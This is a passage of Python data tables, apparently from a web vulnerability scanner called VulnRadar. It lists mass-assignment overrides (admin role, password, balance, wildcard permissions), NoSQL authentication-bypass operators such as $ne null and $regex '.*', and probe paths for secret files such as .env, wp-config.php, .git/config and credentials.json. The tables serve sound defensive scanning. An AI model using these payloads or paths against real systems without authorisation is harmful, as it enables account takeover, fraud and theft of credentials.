        "Role field set to 'admin' — privilege escalation via role override",
    ),
    ("user_role", "admin", "High", "User-role field (alternate naming convention)"),
    # Account state
    ("is_active", True, "Medium", "Reactivation of a disabled/banned account"),
    (
        "status",
        "active",
        "Medium",
        "Account-status override — may reactivate banned accounts",
    ),
    ("verified", True, "Medium", "Email/account verification bypass"),
    ("email_verified", True, "Medium", "Email-verification flag bypass"),
    ("is_verified", True, "Medium", "Verification flag (alternate naming convention)"),
    # Credentials and secrets
    (
        "password",
        "pwned123",
        "Critical",
        "Direct password override — instant account takeover",
    ),
    ("token", "injected", "High", "Auth-token injection — session hijack"),
    ("secret", "injected", "High", "Secret-key injection"),
    ("api_key", "injected", "High", "API-key override"),
    # Identity / ownership
    ("id", 999999, "High", "Object-ID override — may allow acting as another object"),
    (
        "owner_id",
        999999,
        "High",
        "Ownership reassignment — transfers object to attacker-controlled ID",
    ),
    (
        "user_id",
        999999,
        "High",
        "User-ID override on a non-user object — ownership takeover",
    ),
    ("tenant_id", 999999, "High", "Tenant-ID override — cross-tenant data access"),
    # Timestamps (audit-trail tampering)
    (
        "created_at",
        "2000-01-01T00:00:00Z",
        "Medium",
        "Creation-timestamp manipulation — hides object origin",
    ),
    (
        "updated_at",
        "2000-01-01T00:00:00Z",
        "Medium",
        "Update-timestamp manipulation — hides recent changes",
    ),
    # Financial
    ("balance", 999999, "Critical", "Balance manipulation — direct financial fraud"),
    ("credits", 999999, "Critical", "Credit manipulation — direct financial fraud"),
    ("amount", 999999, "High", "Amount field override on a transaction or order"),
    # Permissions
    ("permissions", ["*"], "High", "Wildcard permission injection"),
    ("groups", ["admin"], "High", "Admin-group injection via group membership"),
    (
        "scopes",
        ["*"],
        "High",
        "OAuth-scope widening — privilege escalation on API tokens",
    ),
]

# == NOSQL INJECTION PAYLOADS
nosql_injection_payloads = [
    # Error-based: invalid operators that trigger database errors
    (
        '{"$vulnradar": 1}',
        "error_based",
        "Bogus operator — triggers 'unknown operator' error",
    ),
    (
        '{"$where": "invalid js"}',
        "error_based",
        "$where with invalid JavaScript — triggers syntax error",
    ),
    (
        '{"$regex": "[invalid"}',
        "error_based",
        "$regex with invalid regex — triggers regex error",
    ),
    # Auth-bypass: operators that match everything
    (
        '{"$ne": null}',
        "auth_bypass",
        "$ne null — matches all non-null values (all users)",
    ),
    ('{"$ne": ""}', "auth_bypass", "$ne empty string — matches all non-empty values"),
    (
        '{"$gt": ""}',
        "auth_bypass",
        "$gt empty string — matches all values (always true)",
    ),
    ('{"$gte": ""}', "auth_bypass", "$gte empty string — matches all values"),
    (
        '{"$exists": true}',
        "auth_bypass",
        "$exists true — matches all documents with this field",
    ),
    (
        '{"$nin": []}',
        "auth_bypass",
        "$nin empty array — matches all values (not in empty set)",
    ),
    ('{"$regex": ".*"}', "auth_bypass", "$regex .* — matches all strings"),
    # Comparison: operators for response-length oracles
    ('{"$gt": ""}', "comparison", "$gt empty string — always true"),
    ('{"$lt": ""}', "comparison", "$lt empty string — always false"),
    ('{"$gt": "zzzzzzzzz"}', "comparison", "$gt long string — usually false"),
    (
        '{"$eq": "vulnradar_test"}',
        "comparison",
        "$eq specific value — true if it matches",
    ),
]

nosql_injection_url_operator_payloads = [
    ("[$ne]", "null", "URL-encoded $ne operator"),
    ("[$gt]", "", "URL-encoded $gt operator"),
    ("[$regex]", ".*", "URL-encoded $regex operator"),
    ("[$exists]", "true", "URL-encoded $exists operator"),
]

nosql_injection_error_indicators = [
    # MongoDB errors
    "mongoerror",
    "unknown operator",
    "invalid operator",
    "mongo exception",
    "bson",
    "mongodb",
    "pymongo",
    "mongoose",
    "mongod",
    # CouchDB errors
    "couchdb",
    "bad_request",
    "invalid_json",
    # Generic NoSQL errors
    "nosql",
    "syntax error in query",
    "query parse error",
    "invalid query",
    # JavaScript errors from $where clauses
    "referenceerror",
    "syntaxerror",
    "typeerror",
    "javascript",
]

# == SECURITY MISCONFIGURATION PATTERNS
security_misconfig_credential_files = [
    (
        ".env",
        "Critical",
        "Environment variables — typically holds DB passwords, API keys, and secrets",
    ),
    (".env.production", "Critical", "Production environment variables"),
    (".env.local", "Critical", "Local environment variables"),
    (".env.development", "Critical", "Development environment variables"),
    ("config.json", "High", "Application configuration (JSON)"),
    ("config.yml", "High", "Application configuration (YAML)"),
    ("config.yaml", "High", "Application configuration (YAML)"),
    (
        "application.properties",
        "High",
        "Java application properties — often contains DB URLs and credentials",
    ),
    ("application.yml", "High", "Java Spring Boot configuration"),
    ("settings.py", "High", "Python settings/configuration module"),
    (
        "wp-config.php",
        "Critical",
        "WordPress config — contains DB host, name, user, password",
    ),
    ("database.yml", "Critical", "Rails-style database configuration"),
    (
        ".htpasswd",
        "Critical",
        "Apache HTTP password file — contains hashed credentials",
    ),
    ("credentials.json", "Critical", "Explicit credential storage"),
    (".npmrc", "High", "NPM config — may contain registry auth tokens"),
    (".pypirc", "High", "PyPI config — may contain upload auth tokens"),
    (
        "docker-compose.yml",
        "High",
        "Docker Compose — may expose service topology and secrets",
    ),
    (
        "Dockerfile",
        "Medium",
        "Dockerfile — reveals build steps, base images, installed packages",
    ),
]

security_misconfig_git_exposure = [
    (
        ".git/HEAD",
        "High",
        "Git HEAD ref — confirms .git directory is publicly browsable",
    ),
    (
        ".git/config",
        "High",
        "Git config — may contain remote URLs with embedded tokens",
    ),
    (
        ".git/refs/heads/master",
        "Medium",
        "Git master branch ref — confirms full repository is browsable",
    ),
]

security_misconfig_backup_files = [
    ("index.php.bak", "Medium", "Backup of index.php — may contain full source code"),
    ("index.php~", "Medium", "Editor swap file for index.php"),
    ("index.php.old", "Medium", "Old copy of index.php"),
    ("index.bak", "Medium", "Generic backup file"),
    ("index.orig", "Medium", "Original file before patch"),
    ("app.js.bak", "Medium", "Backup of application JavaScript"),
    (
        ".DS_Store",
        "Low",
        "macOS directory metadata — reveals exact file and folder names",
    ),
    ("Thumbs.db", "Low", "Windows thumbnail cache — reveals directory contents"),
]

security_misconfig_test_files = [
    ("test.php", "Medium", "Test PHP file left in production"),
    ("test.html", "Low", "Test HTML page left in production"),
    (
        "phpinfo.php",
        "High",
        "PHP info — full runtime configuration, loaded modules, env vars",
    ),
    ("info.php", "High", "PHP info (common alternate filename)"),
    (
        "server-status",
        "Medium",
        "Apache server-status — active connections, request log",
    ),
    ("server-info", "Medium", "Apache server-info — loaded modules, configuration"),
    ("console", "Medium", "Debug console (Symfony, Rails, etc.)"),
    ("actuator", "Medium", "Spring Boot Actuator root — enumerates all sub-endpoints"),
    ("actuator/env", "High", "Spring Boot Actuator env — all environment variables"),
    ("actuator/mappings", "High", "Spring Boot Actuator mappings — full route table"),
    ("actuator/health", "Low", "Spring Boot Actuator health — internal status"),
    ("debug", "Medium", "Generic debug endpoint"),
    ("trace", "Medium", "Request-trace endpoint — recent request/response log"),
]

security_misconfig_admin_panels = [
    ("admin", "High", "Default admin path"),
    ("admin/", "High", "Default admin path (trailing slash)"),
    ("administrator", "High", "Default administrator path"),
    ("wp-admin/", "High", "WordPress admin panel"),
    ("phpmyadmin", "High", "phpMyAdmin — direct database management"),
    ("phpmyadmin/", "High", "phpMyAdmin (trailing slash)"),
    ("adminer", "High", "Adminer — direct database management"),
    ("adminer.php", "High", "Adminer single-file installer"),
    ("panel", "Medium", "Generic management panel"),
    ("dashboard", "Medium", "Generic dashboard"),
    ("manage", "Medium", "Generic management path"),
]

security_misconfig_api_docs = [
    ("swagger.json", "Medium", "Swagger/OpenAPI spec — full API blueprint in JSON"),
    ("swagger.yaml", "Medium", "Swagger/OpenAPI spec — full API blueprint in YAML"),
    ("api-docs", "Medium", "API documentation index"),
    ("api/docs", "Medium", "API documentation (nested path)"),
    ("docs/api", "Medium", "API documentation (alternate nesting)"),
    ("openapi.json", "Medium", "OpenAPI 3.x specification (JSON)"),
    ("openapi.yaml", "Medium", "OpenAPI 3.x specification (YAML)"),
    ("redoc", "Medium", "ReDoc-rendered API documentation"),
    ("graphql", "Medium", "GraphQL endpoint — introspection may be enabled"),
    ("graphiql", "Medium", "GraphiQL IDE — interactive query builder"),
]

security_misconfig_dir_listing_indicators = [
    "index of /",  # Apache default title
    "directory listing",  # generic phrase
    "<th>last modified</th>",  # Apache / Nginx sortable column
    "parent directory",  # Apache "Parent Directory" link label
    "[to parent directory]",  # alternate Apache wording
]

security_misconfig_verbose_error_indicators = [
    # Python
    ("traceback (most recent call last)", "Python stack trace"),
    ("django.core.exceptions", "Django internal exception class"),
    ("flask.exceptions", "Flask internal exception class"),
    # Java
    ("java.lang.", "Java exception class"),
    ("at org.", "Java stack-trace frame"),
    ("caused by:", "Java chained-exception marker"),
    # PHP
    ("php fatal error", "PHP fatal error"),
    ("php warning", "PHP warning"),
    ("php notice", "PHP notice"),
    # .NET
    ("system.exception", ".NET System.Exception"),
    ("unhandled exception", ".NET unhandled exception"),
    # Generic
    ("stack trace:", "Generic stack trace"),
]
